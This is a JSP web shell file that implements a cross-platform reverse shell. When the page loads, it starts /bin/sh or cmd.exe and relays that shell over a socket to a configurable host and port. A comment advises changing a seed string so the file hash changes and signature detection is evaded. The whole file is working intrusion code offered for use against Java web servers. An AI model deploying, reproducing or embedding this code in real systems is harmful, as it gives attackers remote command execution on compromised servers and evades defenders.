<%@page import="java.io.InputStream"%>
<%@page import="java.io.IOException"%>
<%@page import="java.io.OutputStream"%>
<%@page import="java.net.InetSocketAddress"%>
<%@page import="java.net.Socket"%>
<%@page import="java.net.SocketTimeoutException"%>
<%@page import="java.util.Arrays"%>

<%-- Copyright (c) 2021 Ivan Šincek --%>
<%-- v4.0 --%>
<%-- Requires Java SE v8 or greater, JDK v8 or greater, and Java EE v5 or greater. --%>
<%-- Works on Linux OS, macOS, and Windows OS. --%>

<%!
    public class ReverseShell {

        // change seed to help you change the file hash
        private String    seed   = "3301Kira";
        private String    addr   = null;
        private int       port   = -1;
        private String    os     = null;
        private String    shell  = null;
        private byte[]    buffer = null;
        private int       clen   = 0;
        private boolean   error  = false;
        private JspWriter out    = null;

        public ReverseShell(String addr, int port, JspWriter out) {
            this.addr = addr;
            this.port = port;
            this.out  = out;
        }

        private void print(String output) {
            try { this.out.print(output); } catch (IOException ex) {}
        }

        private boolean detect() {
            boolean detected = true;
            this.os = System.getProperty("os.name").toUpperCase();
            if (this.os.contains("LINUX") || this.os.contains("MAC")) {
                this.os    = "LINUX";
                this.shell = "/bin/sh";
            } else if (this.os.contains("WIN")) {
                this.os    = "WINDOWS";
                this.shell = "cmd.exe";
            } else {
                detected = false;
                this.print("SYS_ERROR: Underlying operating system is not supported, program will now exit...\n");
            }
            return detected;
        }

        // strings in Java are immutable, so we need to avoid using them to minimize the data in memory
        private void brw(InputStream input, OutputStream output, String iname, String oname) {
            int bytes;
            try {
                do {
                    if (this.os.equals("WINDOWS") && iname.equals("STDOUT") && this.clen > 0) {
                        // for some reason Windows OS pipes STDIN into STDOUT
                        // we do not like that
                        // we need to discard the data from the stream
                        do {
                            bytes = input.read(this.buffer, 0, this.clen >= this.buffer.length ? this.buffer.length : this.clen);
                            this.clen -= this.clen >= this.buffer.length ? this.buffer.length : this.clen;
                        } while (bytes > 0 && this.clen > 0);
                    } else {
                        bytes = input.read(this.buffer, 0, this.buffer.length);
                        if (bytes > 0) {
                            output.write(this.buffer, 0, bytes);
                            output.flush();
                            if (this.os.equals("WINDOWS") && oname.equals("STDIN")) {
                                this.clen += bytes;
                            }
                        } else if (iname.equals("SOCKET")) {
                            this.error = true;
                            this.print("SOC_ERROR: Shell connection has been terminated\n");
                        }
                    }
                } while (input.available() > 0);
            } catch (SocketTimeoutException ex) {
            } catch (IOException ex) {
                this.error = true;
                this.print(String.format("STRM_ERROR: Cannot read from %s or write to %s, program will now exit...\n", iname, oname));
            }
        }

        public void run() {
            if (this.detect()) {
                Process process = null;
                this.buffer = new byte[1024];
                try (
                        Socket client = new Socket();
                    ) {
                    client.setSoTimeout(100);
                    client.connect(new InetSocketAddress(addr, port));
                    process = new ProcessBuilder(this.shell).redirectInput(ProcessBuilder.Redirect.PIPE).redirectOutput(ProcessBuilder.Redirect.PIPE).redirectError(ProcessBuilder.Redirect.PIPE).start();
                    try (
                            OutputStream socin  = client.getOutputStream();
                            InputStream  socout = client.getInputStream();
                            OutputStream stdin  = process.getOutputStream();
                            InputStream  stdout = process.getInputStream();
                            InputStream  stderr = process.getErrorStream();
                        ) {
                        do {
                            if (!process.isAlive()) {
                                this.print("PROC_ERROR: Shell process has been terminated\n");
                                break;
                            }
                            this.brw(socout, stdin, "SOCKET", "STDIN");
                            if (stderr.available() > 0) { this.brw(stderr, socin, "STDERR", "SOCKET"); }
                            if (stdout.available() > 0) { this.brw(stdout, socin, "STDOUT", "SOCKET"); }
                        } while (!this.error);
                    }
                } catch (IOException ex) {
                    this.print(String.format("ERROR: %s\n", ex.getMessage()));
                } finally {
                    if (process != null) { process.destroy(); }
                    Arrays.fill(this.buffer, (byte) 0);
                }
            }
        }

    }
%>

<%@page contentType="text/html" pageEncoding="UTF-8"%>
<%
    out.print("<pre>");
    // change the host address and/or port number as necessary
    ReverseShell sh = new ReverseShell("127.0.0.1", 9000, out);
    sh.run();
    sh = null;
    System.gc();
    out.print("</pre>");
%>
